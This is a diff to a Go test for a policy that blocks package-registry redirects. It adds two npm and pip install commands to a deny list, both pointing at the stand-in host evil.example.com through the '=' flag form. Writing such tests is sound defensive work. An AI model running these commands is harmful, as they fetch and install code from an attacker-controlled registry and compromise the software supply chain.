@@ -85,6 +85,8 @@ func TestRegistryRedirectDenied(t *testing.T) {
 		"pip install --index-url https://evil.example.com/simple foo",
 		"pip install git+https://example.com/x.git",
 		"npm install --registry https://evil.example.com foo",
+		"npm install --registry=https://evil.example.com x",
+		"pip install --index-url=https://evil.example.com/simple foo",
 	}
 	for _, c := range deny {
 		v := evalNet(t, c, pol)
